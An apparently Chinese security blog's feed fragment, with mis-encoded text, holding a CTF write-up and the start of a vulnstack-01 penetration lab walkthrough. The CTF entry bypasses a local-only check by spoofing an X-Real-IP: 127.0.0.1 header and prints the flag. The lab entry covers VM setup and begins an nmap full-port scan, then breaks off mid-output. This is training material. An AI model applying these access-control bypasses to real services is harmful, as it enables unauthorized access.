      <link href="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/"/>
      <url>/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€é¢˜é¢"><a href="#ä¸€ã€é¢˜é¢" class="headerlink" title="ä¸€ã€é¢˜é¢"></a>ä¸€ã€é¢˜é¢</h1><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2018.53.19.png" style="zoom:50%;"><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2018.53.34.png" style="zoom:50%;"><p>æç¤ºåªèƒ½æœ¬åœ°è®¿é—®ã€‚</p><h1 id="äºŒã€åˆ†æ"><a href="#äºŒã€åˆ†æ" class="headerlink" title="äºŒã€åˆ†æ"></a>äºŒã€åˆ†æ</h1><p>æŠ“åŒ…ï¼š</p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2018.56.02.png" style="zoom:50%;"><p>æç¤ºï¼šåªèƒ½æœ¬åœ°è®¿é—®ï¼Œå¯èƒ½æ˜¯å¯¹è¯·æ±‚æ¥æºè¿›è¡Œäº†é™åˆ¶ã€‚</p><p>å°è¯•ç”¨refererå­—æ®µ/x-forward-forå­—æ®µã€‚</p><ul><li>æ·»åŠ Refererå­—æ®µ</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Referer: http://localhostReferer: http://127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2018.57.29.png" style="zoom:50%;"><p>æ²¡ç”¨ã€‚</p><ul><li>æ·»åŠ X-Forwarded-For</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">X-Forwarded-For: <span class="token number">127.0</span>.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2018.59.25.png" style="zoom:50%;"><p>æ²¡ç”¨ã€‚</p><h1 id="ä¸‰ã€X-Real-IP"><a href="#ä¸‰ã€X-Real-IP" class="headerlink" title="ä¸‰ã€X-Real-IP"></a>ä¸‰ã€X-Real-IP</h1><p><code>X-Real-IP</code> æ˜¯ä¸€ä¸ª HTTP è¯·æ±‚å¤´å­—æ®µï¼Œå®ƒç”¨äºåœ¨é€šè¿‡ä»£ç†æˆ–è´Ÿè½½å‡è¡¡å™¨è½¬å‘è¯·æ±‚æ—¶ï¼Œä¿ç•™åŸå§‹è¯·æ±‚çš„å®¢æˆ·ç«¯ IP åœ°å€ä¿¡æ¯ã€‚è¿™ä¸ªå­—æ®µé€šå¸¸åªåœ¨åå‘ä»£ç†æœåŠ¡å™¨ä¸­ä½¿ç”¨ï¼Œç”¨äºè¡¨ç¤ºåŸå§‹è¯·æ±‚çš„å®¢æˆ·ç«¯ IP åœ°å€ã€‚å½“è¯·æ±‚ç»è¿‡åå‘ä»£ç†æœåŠ¡å™¨æ—¶ï¼Œè¯¥æœåŠ¡å™¨ä¼šå°†å®¢æˆ·ç«¯çš„ IP åœ°å€è®¾ç½®åˆ° <code>X-Real-IP</code> å­—æ®µä¸­ï¼Œè¿™æ ·åç«¯æœåŠ¡å™¨å¯ä»¥é€šè¿‡è¯»å– <code>X-Real-IP</code> å­—æ®µæ¥è·å–åŸå§‹è¯·æ±‚çš„å®¢æˆ·ç«¯ IP åœ°å€ã€‚</p><p><code>X-Real-IP</code> VS <code>X-Forwarded-For</code>:</p><p><code>X-Real-IP</code> ä¸ <code>X-Forwarded-For</code> ä¸åŒï¼Œ<code>X-Forwarded-For</code> æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ HTTP è¯·æ±‚å¤´å­—æ®µï¼Œç”¨äºè®°å½•ä»£ç†é“¾ä¸­çš„æ¯ä¸ªä»£ç†æœåŠ¡å™¨çš„ IP åœ°å€ï¼Œè€Œ <code>X-Real-IP</code> é€šå¸¸åªåŒ…å«ä¸€ä¸ª IP åœ°å€ï¼Œè¿™ä¸ªåœ°å€åº”è¯¥åæ˜ äº†å‘èµ·è¯·æ±‚çš„å®¢æˆ·ç«¯çš„çœŸå® IPã€‚<code>X-Real-IP</code> å¹¶ä¸æ˜¯æ ‡å‡†çš„ HTTP è¯·æ±‚å¤´å­—æ®µï¼Œè€Œæ˜¯ç”±æŸäº›ç‰¹å®šçš„åå‘ä»£ç†æœåŠ¡å™¨ï¼ˆå¦‚ Nginxï¼‰å¼•å…¥çš„ï¼Œå› æ­¤ï¼Œå®ƒçš„é€šç”¨æ€§å’Œå…¼å®¹æ€§å¯èƒ½ä¸å¦‚ <code>X-Forwarded-For</code>ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äº <code>X-Real-IP</code> å¯ä»¥è¢«ä¼ªé€ ï¼Œå› æ­¤åœ¨éªŒè¯å…¶çœŸå®æ€§æ—¶ï¼Œä¹Ÿéœ€æ³¨æ„å¯èƒ½å­˜åœ¨çš„ IP ä¼ªé€ é—®é¢˜ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¼€å‘è€…éœ€è¦äº†è§£å¦‚ä½•æ­£ç¡®é…ç½®å’Œä½¿ç”¨è¿™äº›å¤´éƒ¨å­—æ®µï¼Œå¹¶æ³¨æ„éšç§é—®é¢˜ï¼Œåœ¨ä½¿ç”¨å®¢æˆ·ç«¯ IP ä¿¡æ¯æ—¶è¦éµå®ˆéšç§æ³•è§„ï¼Œä¸è¦åœ¨æœªç»æˆæƒçš„æƒ…å†µä¸‹æ”¶é›†æˆ–å­˜å‚¨æ•æ„Ÿä¿¡æ¯ã€‚</p><h1 id="å››ã€è§£é¢˜"><a href="#å››ã€è§£é¢˜" class="headerlink" title="å››ã€è§£é¢˜"></a>å››ã€è§£é¢˜</h1><p>æ·»åŠ <code>x-real-ip</code>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">x-real-ip: <span class="token number">127.0</span>.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>æ³¨æ„ï¼šç»è¿‡å®é™…æµ‹è¯•ï¼Œå¯ä»¥å¿½ç•¥å¤§å°å†™ï¼šX-Real-IPä¹Ÿå¯ä»¥ã€‚</p></blockquote><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2019.11.17.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°è¿”å›ä¸€ä¸ªç™»å½•é¡µé¢ï¼ŒåŒ…å«ä¸€ä¸ªformè¡¨å•ã€‚</p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2019.13.43.png" style="zoom:50%;"><p>ç‚¹å‡»ç™»å½•æŒ‰é’®ï¼ŒæŠ“å–POSTæ•°æ®åŒ…ï¼š</p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2019.14.10.png" style="zoom:50%;"><p>ç›´æ¥æäº¤ä»ç„¶ä¼šæç¤ºï¼šåªèƒ½æœ¬åœ°è®¿é—®ã€‚</p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2019.17.59.png" style="zoom:50%;"><p>æ·»åŠ X-Real-IP:127.0.0.1ä¹‹åæäº¤POSTæ•°æ®ï¼š</p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2019.18.30.png" style="zoom:50%;"><p>æˆåŠŸè·å¾—flagã€‚</p><ul><li>æµ‹è¯•POSTæ•°æ®åŒ…çš„æœ€ç®€å½¢å¼ï¼š</li></ul><p>ç»è¿‡æµ‹è¯•ï¼Œå¦‚æœæƒ³è¦æ‰‹åŠ¨æ„é€ POSTæ•°æ®åŒ…çš„è¯ï¼Œæœ€ç®€å½¢å¼å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST / HTTP/1.1Host: node5.buuoj.cn:26861Content-Type: application/x-www-form-urlencodedX-Real-IP: <span class="token number">127.0</span>.0.1<span class="token assign-left variable">username</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">password</span><span class="token operator">=</span>wwoj2wio2jw93ey43eiuwdjnewkndjlwe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2019.35.45.png" style="zoom:50%;"><p>é™¤äº†Hostå­—æ®µã€è§£é¢˜å¿…é¡»çš„X-Real-IPå­—æ®µå¤–ï¼Œä¿ç•™Content-Typeå­—æ®µå³å¯ã€‚</p><p>flagï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>c5766d2f-15bc-4ad2-b99f-4b4a2638717b<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬é¢˜ç›®ä¸»è¦è€ƒå¯Ÿä½¿ç”¨BPç­‰ä»£ç†å·¥å…·ä¿®æ”¹è¯·æ±‚åŒ…çš„æ–¹æ³•ï¼Œæ ¸å¿ƒè€ƒç‚¹ï¼š</p><ul><li><p>1ï¼‰ä¿®æ”¹/æ·»åŠ <code>X-Real-IP=127.0.0.1</code>ï¼Œç»•è¿‡æœ¬åœ°è®¿é—®é™åˆ¶ã€‚</p></li><li><p>2ï¼‰yakit/BPä¿®æ”¹æ•°æ®åŒ…ã€‚</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTFå®æˆ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> CTFå®æˆ˜ </tag>
            
            <tag> burpå·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnstack-01-é¶åœºç»¼åˆæ¸—é€</title>
      <link href="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/"/>
      <url>/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€é¶åœºæ­å»º"><a href="#ä¸€ã€é¶åœºæ­å»º" class="headerlink" title="ä¸€ã€é¶åœºæ­å»º"></a>ä¸€ã€é¶åœºæ­å»º</h1><ul><li><p>é¶åœºä¸‹è½½é“¾æ¥ï¼š <a href="https://pan.baidu.com/s/1LF48du6PnvCH6NiZO5Yqxw">https://pan.baidu.com/s/1LF48du6PnvCH6NiZO5Yqxw</a> æå–ç : 331i</p></li><li><p>è™šæ‹Ÿæœºç»Ÿä¸€å¯†ç ï¼šhongrisec@2019 (win2008ä¸»æœº/win7ä¼šæç¤ºå¯†ç å·²è¿‡æœŸï¼ŒæŒ‰ç…§æç¤ºä¿®æ”¹å³å¯ï¼Œwin2008æˆ‘æ”¹æˆäº†hongrisec@2025ï¼Œwin7åé¢æˆ‘æ”¹æˆäº†sxksec@2025ï¼‰ã€‚</p></li></ul><h2 id="1-1-ç½‘ç»œæ‹“æ‰‘å›¾"><a href="#1-1-ç½‘ç»œæ‹“æ‰‘å›¾" class="headerlink" title="1.1 ç½‘ç»œæ‹“æ‰‘å›¾"></a>1.1 ç½‘ç»œæ‹“æ‰‘å›¾</h2><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-13%2017.09.09.png" style="zoom:40%;"><p>æœ¬é¶åœºæ˜¯ä¸€ä¸ªäºŒå±‚ç½‘ç»œï¼ŒDMZåŒº+å†…ç½‘ã€‚</p><h2 id="1-2-ç½‘å¡å’Œç½‘ç»œé…ç½®"><a href="#1-2-ç½‘å¡å’Œç½‘ç»œé…ç½®" class="headerlink" title="1.2 ç½‘å¡å’Œç½‘ç»œé…ç½®"></a>1.2 ç½‘å¡å’Œç½‘ç»œé…ç½®</h2><p>æ¥ä¸‹æ¥éœ€è¦åœ¨æœ¬åœ°é€šè¿‡vmwareæŠŠä¸‰å°æœºå™¨çš„ç½‘ç»œè¿é€šã€‚ä¹‹å‰æ­å»ºè¿‡[WHOAMIé¶åœº][<a href="https://sxksec.cn/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/]%EF%BC%88%E6%98%AF%E7%BA%A2%E6%97%A5%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E7%9A%84%E7%AC%AC%E4%B8%83%E4%B8%AA%EF%BC%89%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E5%80%9F%E5%8A%A9%E4%BB%A5%E5%BE%80%E7%9A%84%E7%BB%8F%E9%AA%8C%E8%BF%9B%E8%A1%8C%E8%AE%BE%E7%BD%AE%EF%BC%9A">https://sxksec.cn/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/]ï¼ˆæ˜¯çº¢æ—¥ç³»åˆ—é¶åœºçš„ç¬¬ä¸ƒä¸ªï¼‰ï¼Œè¿™é‡Œæˆ‘å€ŸåŠ©ä»¥å¾€çš„ç»éªŒè¿›è¡Œè®¾ç½®ï¼š</a></p><p>1ï¼‰VM1-webæœåŠ¡å™¨-win7ï¼š</p><p>ç½‘å¡1ï¼šè®¾ç½®ä¸ºæ¡¥æ¥æ¨¡å¼-172.20.10.2/32ï¼Œèƒ½è®¿é—®äº’è”ç½‘ã€‚ </p><p>ç½‘å¡2ï¼šä»…ä¸»æœºæ¨¡å¼-vmnet14-192.168.93.3/24ç½‘æ®µ ï¼ˆéœ€è¦å…³æœºæ·»åŠ ä¸€å—ç½‘å¡ï¼‰</p><p>2ï¼‰æ”»å‡»æœºkaliï¼š</p><p>è®¾ç½®ä¸ºæ¡¥æ¥æ¨¡å¼ï¼Œè¿™æ ·è·ŸVM1åŒå¤„äºä¸€ä¸ªç½‘æ®µ-172.20.10.4/32</p><p>3ï¼‰VM2-åŸŸæˆå‘˜-win2003ï¼š</p><p>ä»…ä¸»æœºæ¨¡å¼-vmnet14-192.168.93.10 /24ç½‘æ®µ</p><p>4ï¼‰VM3-åŸŸæ§-win2008ï¼š</p><p>ä»…ä¸»æœºæ¨¡å¼-vmnet14-192.168.93.2/24ç½‘æ®µ</p><p>æ³¨æ„ï¼šå¦‚æœåˆ‡æ¢ç½‘å¡æ¨¡å¼ä¹‹åipä¸èƒ½åŠæ—¶è·å–æ›´æ–°ï¼Œå¯ä»¥æ£€æŸ¥ä¸€ä¸‹æ˜¯å¦å¼€å¯äº†çš„DHCPæœåŠ¡ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥æ‰‹åŠ¨é…ç½®ä¸€ä¸‹IPã€‚</p><h2 id="1-3-ç½‘ç»œè¿é€šæ€§"><a href="#1-3-ç½‘ç»œè¿é€šæ€§" class="headerlink" title="1.3 ç½‘ç»œè¿é€šæ€§"></a>1.3 ç½‘ç»œè¿é€šæ€§</h2><ul><li>åŸŸå†…ä¸»æœºwin2003å’Œwin2008äº’ç›¸å¯ä»¥äº’ç›¸pingé€šã€‚</li><li>DMZä¸»æœºwin7å¯ä»¥pingé€šwin2003ï¼Œä½†æ˜¯win2003ping ä¸é€šDMZåŒºçš„win7ï¼Œå¯èƒ½æ˜¯å› ä¸ºé˜²ç«å¢™çš„åŸå› ä¸è¿‡ä¹Ÿæ­£å¸¸ï¼Œå…³ä¸€ä¸‹å…ˆã€‚</li><li>DMZä¸»æœºwin7å¯ä»¥å’Œwin2008äº’ç›¸pingé€šã€‚</li><li>win7å¯ä»¥pingé€šäº’è”ç½‘</li><li>æ”»å‡»æœºå¯ä»¥å’Œwin7äº’ç›¸pingé€šã€‚</li></ul><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2009.19.30.png" alt="åˆå§‹é˜²ç«å¢™å¼€å¯çŠ¶æ€" style="zoom:50%;"><p>è¿™é‡Œæœ‰ä¸‰ç§ç½‘ç»œä½ç½®çš„é˜²ç«å¢™ã€‚å…³é—­å…¬ç”¨ç½‘ç»œçš„é˜²ç«å¢™ï¼Œkaliã€win2008å’Œwin2003å°±éƒ½å¯ä»¥pingé€šwin7äº†ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2009.20.42.png" style="zoom:50%;"><blockquote><h4 id="è¿™ä¸‰ç§ç½‘ç»œä½ç½®çš„é˜²ç«å¢™åˆ†åˆ«æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ"><a href="#è¿™ä¸‰ç§ç½‘ç»œä½ç½®çš„é˜²ç«å¢™åˆ†åˆ«æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ" class="headerlink" title="è¿™ä¸‰ç§ç½‘ç»œä½ç½®çš„é˜²ç«å¢™åˆ†åˆ«æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ"></a>è¿™ä¸‰ç§ç½‘ç»œä½ç½®çš„é˜²ç«å¢™åˆ†åˆ«æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ</h4><p>è¿™ä¸‰ç§ç½‘ç»œä½ç½®ç±»å‹ï¼ˆåŸŸç½‘ç»œä½ç½®ã€å®¶åº­æˆ–å·¥ä½œç½‘ç»œä½ç½®ã€å…¬ç”¨ç½‘ç»œä½ç½®ï¼‰åœ¨Windowsé˜²ç«å¢™ä¸­å…·æœ‰ä¸åŒçš„å®‰å…¨é…ç½®å’Œä½œç”¨ï¼Œä»¥é€‚åº”ä¸åŒçš„ç½‘ç»œç¯å¢ƒå’Œå®‰å…¨éœ€æ±‚ï¼š</p><ol><li><strong>åŸŸç½‘ç»œä½ç½®ï¼ˆDomain Networkï¼‰</strong>ï¼š<ul><li>é€šå¸¸ç”¨äºè¿æ¥åˆ°å·¥ä½œç¯å¢ƒä¸­çš„åŸŸæ§åˆ¶å™¨ã€‚</li><li>åœ¨è¿™ç§ç½‘ç»œç¯å¢ƒä¸­ï¼Œè®¾å¤‡é€šå¸¸å¤„äºä¸€ä¸ªå—ä¿¡ä»»çš„ç½‘ç»œä¸­ï¼Œç”±ç»„ç»‡çš„ITéƒ¨é—¨ç®¡ç†ã€‚</li><li>é˜²ç«å¢™è®¾ç½®å¯èƒ½ç›¸å¯¹å®½æ¾ï¼Œå› ä¸ºç½‘ç»œä¸­çš„å…¶ä»–è®¾å¤‡å’Œç”¨æˆ·è¢«è®¤ä¸ºæ˜¯å¯ä¿¡çš„ã€‚</li><li>å¯èƒ½å…è®¸æ›´å¤šçš„å†…éƒ¨é€šä¿¡å’Œèµ„æºå…±äº«ã€‚</li></ul></li><li><strong>å®¶åº­æˆ–å·¥ä½œï¼ˆä¸“ç”¨ï¼‰ç½‘ç»œä½ç½®ï¼ˆPrivate Networkï¼‰</strong>ï¼š<ul><li>ç”¨äºå®¶åº­ã€å°å‹åŠå…¬å®¤æˆ–ä¼ä¸šå†…éƒ¨ç½‘ç»œï¼Œè¿™äº›ç½‘ç»œè¢«è®¤ä¸ºæ˜¯ç§äººå’Œå—ä¿¡ä»»çš„ã€‚</li><li>é˜²ç«å¢™ä¼šæä¾›ä¸€å®šç¨‹åº¦çš„ä¿æŠ¤ï¼Œä½†å¯èƒ½ä¼šå…è®¸æ›´å¤šçš„åº”ç”¨ç¨‹åºå’ŒæœåŠ¡é€šè¿‡ï¼Œä»¥ä¾¿äºå®¶åº­æˆ–å·¥ä½œç½‘ç»œä¸­çš„è®¾å¤‡å¯ä»¥ç›¸äº’é€šä¿¡ã€‚</li><li>ç”¨æˆ·é€šå¸¸éœ€è¦æ‰‹åŠ¨è®¾ç½®å“ªäº›åº”ç”¨ç¨‹åºå¯ä»¥æ¥æ”¶ä¼ å…¥è¿æ¥ï¼Œä½†é»˜è®¤æƒ…å†µä¸‹å¯èƒ½ä¼šå…è®¸ä¸€äº›å¸¸è§çš„å®¶åº­æˆ–å·¥ä½œç½‘ç»œåº”ç”¨ç¨‹åºã€‚</li></ul></li><li><strong>å…¬ç”¨ç½‘ç»œä½ç½®ï¼ˆPublic Networkï¼‰</strong>ï¼š<ul><li>ç”¨äºå’–å•¡åº—ã€æœºåœºã€é…’åº—ç­‰å…¬å…±åœºæ‰€çš„ç½‘ç»œï¼Œè¿™äº›ç½‘ç»œè¢«è®¤ä¸ºæ˜¯ä¸å®‰å…¨çš„ã€‚</li><li>é˜²ç«å¢™è®¾ç½®é€šå¸¸æ›´ä¸ºä¸¥æ ¼ï¼Œä»¥é˜²æ­¢æ½œåœ¨çš„ç½‘ç»œæ”»å‡»å’Œæœªç»æˆæƒçš„è®¿é—®ã€‚</li><li>é»˜è®¤æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¼šé˜»æ­¢æ‰€æœ‰ä¼ å…¥è¿æ¥ï¼Œé™¤éç”¨æˆ·æ˜ç¡®å…è®¸ç‰¹å®šåº”ç”¨ç¨‹åºé€šè¿‡é˜²ç«å¢™ã€‚</li><li>å»ºè®®åœ¨è¿™ç§ç½‘ç»œç¯å¢ƒä¸‹ä¸è¦è¿›è¡Œæ•æ„Ÿæ“ä½œï¼Œå¦‚ç½‘ä¸Šé“¶è¡Œæˆ–è®¿é—®å…¬å¸èµ„æºã€‚</li></ul></li></ol><p>åœ¨Windowsé˜²ç«å¢™ä¸­ï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®å½“å‰æ‰€å¤„çš„ç½‘ç»œç¯å¢ƒé€‰æ‹©ç›¸åº”çš„ç½‘ç»œä½ç½®ï¼Œä»¥è·å¾—é€‚å½“çš„å®‰å…¨ä¿æŠ¤ã€‚ä¾‹å¦‚ï¼Œåœ¨å…¬å…±ç½‘ç»œç¯å¢ƒä¸‹ï¼Œç”¨æˆ·åº”è¯¥é€‰æ‹©â€œå…¬ç”¨ç½‘ç»œä½ç½®â€ï¼Œä»¥ç¡®ä¿é˜²ç«å¢™æä¾›æœ€å¤§ç¨‹åº¦çš„ä¿æŠ¤ã€‚åœ¨å®¶åº­æˆ–å·¥ä½œç½‘ç»œç¯å¢ƒä¸‹ï¼Œç”¨æˆ·å¯ä»¥é€‰æ‹©â€œå®¶åº­æˆ–å·¥ä½œï¼ˆä¸“ç”¨ï¼‰ç½‘ç»œä½ç½®â€ï¼Œä»¥ä¾¿äºç½‘ç»œä¸­çš„è®¾å¤‡å¯ä»¥æ–¹ä¾¿åœ°è¿›è¡Œé€šä¿¡ã€‚è€Œåœ¨è¿æ¥åˆ°å…¬å¸çš„åŸŸç½‘ç»œæ—¶ï¼Œç”¨æˆ·åº”è¯¥é€‰æ‹©â€œåŸŸç½‘ç»œä½ç½®â€ï¼Œä»¥ç¬¦åˆå…¬å¸çš„å®‰å…¨ç­–ç•¥å’Œè¦æ±‚ã€‚</p><p>æ‰€ä»¥ï¼Œä»é˜²æŠ¤å¼ºåº¦æ¥è®²ï¼Œå…¬ç”¨ç½‘ç»œé˜²æŠ¤å¢™&gt;å®¶åº­æˆ–å·¥ä½œç½‘ç»œ&gt;åŸŸç½‘ç»œï¼Œåœ¨å…³é—­é˜²ç«å¢™çš„æ—¶å€™å¯ä»¥æŒ‰ç…§è¿™ä¸ªé¡ºåºå…³é—­ï¼Œä¸éœ€è¦ä¸€è‚¡è„‘å…¨éƒ½å…³é—­ï¼Œæœ‰æ—¶å€™å¯èƒ½å…³æ‰å…¬ç”¨ç½‘ç»œçš„é˜²ç«å¢™å°±å¯ä»¥äº†ã€‚</p></blockquote><h2 id="1-4-é…ç½®DMZåŒºçš„webæœåŠ¡"><a href="#1-4-é…ç½®DMZåŒºçš„webæœåŠ¡" class="headerlink" title="1.4 é…ç½®DMZåŒºçš„webæœåŠ¡"></a>1.4 é…ç½®DMZåŒºçš„webæœåŠ¡</h2><p>åœ¨  DMZåŒºæœåŠ¡å™¨Win7ä¸»æœºçš„ C ç›˜æ‰¾åˆ° PhpStudy å¯åŠ¨ Web æœåŠ¡ï¼ˆæ¨¡æ‹Ÿå¤–ç½‘ Web ç«™ç‚¹ï¼‰ï¼š</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2009.42.44.png" style="zoom:50%;"><p>å¼€å¯ä¹‹åï¼Œæˆ‘ä»¬åœ¨ç‰©ç†æœºï¼ˆæˆ‘çš„æ˜¯macï¼‰è®¿é—®ä¸€ä¸‹win7ï¼Œå¯ä»¥æ­£å¸¸è®¿é—®åˆ°PHPæ¢é’ˆï¼Œè¯´æ˜webæœåŠ¡å™¨éƒ¨ç½²æˆåŠŸã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2009.43.35.png" style="zoom:30%;"><p>åŸŸç”¨æˆ·win2003ä¹Ÿå¯ä»¥è®¿é—®åˆ°PHPæ¢é’ˆã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2009.46.32.png" style="zoom:50%;"><p>è‡³æ­¤ï¼Œé¶åœºåŸºæœ¬æ­å»ºå®Œæ¯•ã€‚</p><h1 id="äºŒã€è¾¹ç•Œçªç ´"><a href="#äºŒã€è¾¹ç•Œçªç ´" class="headerlink" title="äºŒã€è¾¹ç•Œçªç ´"></a>äºŒã€è¾¹ç•Œçªç ´</h1><h2 id="2-1-ç«¯å£æ‰«æ"><a href="#2-1-ç«¯å£æ‰«æ" class="headerlink" title="2.1 ç«¯å£æ‰«æ"></a>2.1 ç«¯å£æ‰«æ</h2><p>DMZåŒºwebæœåŠ¡å™¨çš„ipä¸º172.20.10.2ï¼Œé¦–å…ˆå¯¹å®ƒè¿›è¡Œç«¯å£å‘ç°ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token number">172.20</span>.10.2 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span> <span class="token parameter variable">-Pn</span> -p-   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>rootğŸ’€kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>â””â”€<span class="token comment"># nmap 172.20.10.2 -sV -sC -Pn -p-   </span>Host discovery disabled <span class="token punctuation">(</span>-Pn<span class="token punctuation">)</span>. All addresses will be marked <span class="token string">'up'</span> and scan <span class="token builtin class-name">times</span> will be slower.Starting Nmap <span class="token number">7.91</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-02-13 <span class="token number">22</span>:38 ESTNmap scan report <span class="token keyword">for</span> <span class="token number">172.20</span>.10.2Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0020s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">65524</span> closed portsPORT     STATE SERVICE      VERSION<span class="token number">80</span>/tcp   <span class="token function">open</span>  http         Apache httpd <span class="token number">2.4</span>.23 <span class="token punctuation">((</span>Win32<span class="token punctuation">)</span> OpenSSL/1.0.2j PHP/5.4.45<span class="token punctuation">)</span><span class="token operator">|</span>_http-server-header: Apache/2.4.23 <span class="token punctuation">(</span>Win32<span class="token punctuation">)</span> OpenSSL/1.0.2j PHP/5.4.45<span class="token operator">|</span>_http-title: phpStudy <span class="token punctuation">\</span>xE6<span class="token punctuation">\</span>x8E<span class="token punctuation">\</span>xA2<span class="token punctuation">\</span>xE9<span class="token punctuation">\</span>x92<span class="token punctuation">\</span>x88 <span class="token number">2014</span> <span class="token number">135</span>/tcp  <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">139</span>/tcp  <span class="token function">open</span>  netbios-ssn  Microsoft Windows netbios-ssn<span class="token number">445</span>/tcp  <span class="token function">open</span>  microsoft-ds Microsoft Windows <span class="token number">7</span> - <span class="token number">10</span> microsoft-ds <span class="token punctuation">(</span>workgroup: GOD<span class="token punctuation">)</span><span class="token number">1025</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">1026</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">1027</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">1028</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">1029</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">1036</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">3306</span>/tcp <span class="token function">open</span>  mysql        MySQL <span class="token punctuation">(</span>unauthorized<span class="token punctuation">)</span>MAC Address: 00:0C:29:82:51:0C <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Service Info: Host: STU1<span class="token punctuation">;</span> OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windowsHost script results:<span class="token 